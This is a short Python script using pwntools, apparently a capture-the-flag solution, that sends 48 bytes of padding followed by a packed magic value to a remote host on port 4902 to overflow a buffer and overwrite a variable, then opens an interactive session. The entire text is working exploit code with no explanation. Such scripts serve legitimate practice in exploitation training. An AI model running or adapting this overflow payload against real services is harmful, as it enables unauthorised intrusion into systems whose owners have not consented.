from pwn import *

padding = b"\x41" * 48
secret = p32(0x67616c66)

p = remote("thekidofarcrania.com", 4902)
p.recv()
p.sendline(padding + secret)
p.interactive()